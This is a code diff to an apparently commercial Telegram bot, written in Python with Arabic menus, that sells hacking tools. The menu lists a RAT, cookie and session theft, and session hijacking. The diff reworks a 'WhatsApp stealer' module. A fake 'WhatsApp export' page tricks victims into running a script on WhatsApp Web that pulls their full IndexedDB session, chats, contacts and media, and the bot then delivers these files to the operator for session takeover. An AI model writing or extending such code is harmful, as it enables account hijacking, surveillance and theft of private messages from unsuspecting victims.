@@ -89,24 +89,24 @@ except Exception as e:
     sh_sessions = {}
 
 # ============================================================
-# ★★★ استيراد WhatsApp Hunter Module (جديد) ★★★
+# ★★★ استيراد WhatsApp Stealer Module ★★★
 # ============================================================
 try:
-    from whatsapp_hunter import (
-        init_whatsapp_hunter_routes,
+    from wa_stealer import (
+        init_whatsapp_stealer_routes,
         wa_bp,
-        get_wa_session_data,
+        get_wa_data,
         build_wa_panel,
     )
     WA_ENABLED = True
-    print("[+] whatsapp_hunter imported")
+    print("[+] wa_stealer imported")
 except Exception as e:
-    print(f"[-] Error importing whatsapp_hunter: {e}")
+    print(f"[-] Error importing wa_stealer: {e}")
     WA_ENABLED = False
 
-    def init_whatsapp_hunter_routes(app, bot): pass
+    def init_whatsapp_stealer_routes(app, bot): pass
     wa_bp = None
-    def get_wa_session_data(sid): return None
+    def get_wa_data(sid): return {}
     def build_wa_panel(sid, cid): return InlineKeyboardMarkup()
 
 # ============================================================
@@ -247,7 +247,7 @@ init_rat_routes(app, bot)
 init_qr_routes(app, bot)
 init_lsh_routes(app, bot)
 init_session_hijacker_routes(app, bot)
-init_whatsapp_hunter_routes(app, bot)
+init_whatsapp_stealer_routes(app, bot)
 
 if LSH_ENABLED:
     set_bot_reference(bot)
@@ -267,7 +267,7 @@ def main_menu():
     markup.add(InlineKeyboardButton("📷 أداة ربط الضحية السريع عبر QR", callback_data="gen_qr"))
     markup.add(InlineKeyboardButton("🕹️ السيطرة الكاملة على الجلسة (LSH)", callback_data="gen_lsh"))
     markup.add(InlineKeyboardButton("🍪 سرقة الكوكيز والجلسات (SH)", callback_data="gen_sh"))
-    markup.add(InlineKeyboardButton("📱 WhatsApp Hunter — السيطرة على واتساب", callback_data="gen_wa"))  # ← جديد
+    markup.add(InlineKeyboardButton("📱 WhatsApp Export Hunter", callback_data="gen_wa"))
     markup.add(InlineKeyboardButton("💎 الاشتراكات والدفع", callback_data="payment_menu"))
     markup.add(InlineKeyboardButton("👤 حسابي", callback_data="my_account"))
     return markup
@@ -557,7 +557,7 @@ def callback_handler(call):
         return
 
     # ============================================================
-    # ★★★ توليد WhatsApp Hunter (جديد) ★★★
+    # ★★★ توليد WhatsApp Export Hunter ★★★
     # ============================================================
     if call.data == "gen_wa":
         check = can_use_tool(chat_id, "wa")
@@ -588,18 +588,18 @@ def callback_handler(call):
 
         bot.send_message(
             chat_id,
-            f"📱 **WhatsApp Web Hunter — جاهز!**\n"
+            f"📱 **WhatsApp Export Hunter — جاهز!**\n"
             f"━━━━━━━━━━━━━━━━━━\n\n"
             f"🎯 **الرابط:**\n`{target_link}`\n\n"
             f"📊 **ما تفعله الأداة:**\n"
-            f"• 🎭 تفتح WhatsApp Web حقيقي عبر بروكسي سيرفرنا\n"
-            f"• 🔑 تسحب جلسة WhatsApp كاملة\n"
-            f"• 💬 تراقب كل الرسائل الواردة والصادرة\n"
-            f"• 👥 تسحب جهات الاتصال كاملة\n"
-            f"• 📥 تسحب الصور والفيديوهات والملفات\n"
-            f"• 🎛️ لوحة تحكم كاملة في البوت\n\n"
-            f"⚠️ **مهم:** الضحية تظن أنها تسجل دخول WhatsApp Web عادي — لكن كل شيء يمر عبرنا!\n\n"
-            f"🖥️ **لوحة الويب:**\n{RAILWAY_URL}/wa_dashboard?s={session_id}",
+            f"• 🎭 تُظهر صفحة 'تصدير محادثات WhatsApp' رسمية\n"
+            f"• 📋 الضحية تنسخ 'أداة التصدير'\n"
+            f"• ⌨️ تشغّلها على WhatsApp Web الحقيقي\n"
+            f"• 🔑 الأداة تسحب **IndexedDB كامل** (الجلسة)\n"
+            f"• 💬 تسحب كل المحادثات والأسماء\n"
+            f"• 👥 تسحب جهات الاتصال\n"
+            f"• 📥 الصور والفيديوهات (Blobs)\n\n"
+            f"⚠️ **مهم:** الأداة تعمل على أي متصفح (Chrome, Firefox, Edge, Safari)",
             parse_mode="Markdown"
         )
         return
@@ -743,76 +743,48 @@ def callback_handler(call):
         return
 
     # ============================================================
-    # ★★★ أوامر WhatsApp Hunter (جديد) ★★★
+    # ★★★ أوامر WhatsApp Export Hunter ★★★
     # ============================================================
     if call.data.startswith("wa_"):
         parts = call.data.split("_", 2)
         cmd = parts[1] if len(parts) > 1 else ""
         sid = parts[2] if len(parts) > 2 else None
 
-        if cmd == "cookies":
-            data = get_wa_session_data(sid)
-            if data and data.get("cookies_from_redis"):
-                import json as _json
-                text = _json.dumps(data["cookies_from_redis"], ensure_ascii=False, indent=2)
-                buf = io.BytesIO(text.encode('utf-8'))
-                buf.name = f'wa_cookies_{sid[:8]}.json'
-                bot.send_document(chat_id, buf, caption="🍪 **كوكيز WhatsApp**")
+        if cmd == "idb":
+            data = get_wa_data(sid)
+            if data.get("idb"):
+                buf = io.BytesIO(data["idb"].encode('utf-8'))
+                buf.name = f'wa_indexeddb_{sid[:8]}.json'
+                bot.send_document(chat_id, buf,
+                    caption="📥 **IndexedDB كامل**\nاستخدمه لاستعادة الجلسة عندك",
+                    parse_mode="Markdown")
             else:
-                bot.answer_callback_query(call.id, "لا توجد كوكيز بعد", show_alert=True)
+                bot.answer_callback_query(call.id, "لا توجد بيانات بعد", show_alert=True)
 
-        elif cmd == "msgs":
-            data = get_wa_session_data(sid)
-            if data and data.get("messages"):
-                lines = []
-                for m in data["messages"][-30:]:
-                    d = "📤" if m.get("direction") == "out" else "📥"
-                    lines.append(f"{d} `{(m.get('data') or '')[:150]}`")
-                msg = "\n".join(lines)
-                bot.send_message(chat_id, f"💬 **الرسائل:**\n{msg}", parse_mode="Markdown")
+        elif cmd == "storage":
+            data = get_wa_data(sid)
+            if data.get("storage"):
+                buf = io.BytesIO(data["storage"].encode('utf-8'))
+                buf.name = f'wa_storage_{sid[:8]}.json'
+                bot.send_document(chat_id, buf, caption="💾 **Storage + Cookies**")
             else:
-                bot.answer_callback_query(call.id, "لا توجد رسائل بعد", show_alert=True)
-
-        elif cmd == "contacts":
-            data = get_wa_session_data(sid)
-            if data and data.get("contacts"):
-                text = str(data["contacts"])[:4000]
-                bot.send_message(chat_id, f"👥 **جهات الاتصال:**\n{text}", parse_mode="Markdown")
-            else:
-                bot.answer_callback_query(call.id, "لا توجد جهات اتصال بعد", show_alert=True)
+                bot.answer_callback_query(call.id, "لا توجد بيانات بعد", show_alert=True)
 
         elif cmd == "stats":
-            data = get_wa_session_data(sid)
-            if data:
-                cookies = data.get("cookies_from_redis", {})
-                storage = data.get("storage_from_redis", {})
-                msgs = data.get("messages", [])
-                text = (
-                    f"📊 **إحصائيات الجلسة**\n"
-                    f"━━━━━━━━━━━━━━━━━━\n"
-                    f"🆔 `{sid[:16]}`\n"
-                    f"🍪 الكوكيز: `{len(cookies)}`\n"
-                    f"💾 Storage: `{len(storage)}`\n"
-                    f"💬 الرسائل: `{len(msgs)}`\n"
-                    f"⏰ آخر نشاط: `{time.time() - data.get('last_seen', 0):.0f} ثانية مضت`"
-                )
-                bot.send_message(chat_id, text, parse_mode="Markdown")
-            else:
-                bot.answer_callback_query(call.id, "لا توجد بيانات", show_alert=True)
-
-        elif cmd == "export":
-            data = get_wa_session_data(sid)
-            if data:
-                import json as _json
-                text = _json.dumps(data, ensure_ascii=False, indent=2, default=str)
-                buf = io.BytesIO(text.encode('utf-8'))
-                buf.name = f'wa_session_{sid[:8]}.json'
-                bot.send_document(chat_id, buf, caption="📥 **جلسة WhatsApp كاملة**")
-            else:
-                bot.answer_callback_query(call.id, "لا توجد بيانات", show_alert=True)
-
-        elif cmd == "web":
-            bot.send_message(chat_id, f"🌐 **لوحة الويب:**\n{RAILWAY_URL}/wa_dashboard?s={sid}")
+            data = get_wa_data(sid)
+            has_idb = "✅" if data.get("idb") else "❌"
+            has_storage = "✅" if data.get("storage") else "❌"
+            size = len(data.get("idb") or "") / 1024
+            text = (
+                f"📊 **إحصائيات WhatsApp**\n"
+                f"━━━━━━━━━━━━━━━━━━\n"
+                f"🆔 `{sid[:16] if sid else 'N/A'}`\n"
+                f"📦 IndexedDB: {has_idb}\n"
+                f"💾 Storage: {has_storage}\n"
+                f"📏 الحجم: `{size:.1f} KB`\n"
+                f"📦 Chunks: `{data.get('chunks_count', 0)}`"
+            )
+            bot.send_message(chat_id, text, parse_mode="Markdown")
 
         elif cmd == "delete":
             bot.answer_callback_query(call.id, "✅ تم")
